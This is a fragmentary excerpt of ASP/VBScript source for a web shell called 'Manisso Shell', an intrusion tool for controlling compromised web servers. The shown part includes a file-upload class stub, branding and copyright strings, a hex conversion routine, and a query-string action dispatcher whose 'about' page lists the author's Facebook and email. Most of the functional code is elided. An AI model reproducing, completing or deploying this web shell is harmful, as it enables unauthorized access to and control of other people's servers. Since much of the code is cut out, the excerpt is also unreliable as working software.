...
Class UploadedFile
	...
	End Sub
End Class
startcode = "<html><head><title>.:: Manisso Shell ::.</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""https://www.facebook.com/dzmanisso"" target=""_blank""> My Facebook</a> ::.</font><br>"
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         ...
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: Manisso Shell ::. &copy; BY <a href='https://facebook.com/dzmanisso'>Manisso</a> - <a href='' target='_blank'>Dz</a> ::.</font>"
...
keydec="<font face='arial' size='1'>.:: Manisso Shell &copy; BY <a href='Manisso:'>Manisso</a> - <a href='' target='_blank'></a> ::.</font>"
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "about"
		...
		checa = checking(cprthtml,keydec)
		Call hdr()
		response.Write "<br><br><br><body topmargin=5 leftmargin=0><center><h4>Coded By Manissso"
		response.Write "<br><br>"
		response.Write "<font size=2 color=Red face='courier new'>Facebook: FB.COM/dzmanisso :)</font>"
		response.Write "<br>"
		response.Write "<font size=2 color=Red face='courier new'>E-Mail: manisso@mail.com</font>"
		response.Write "<br><br>"
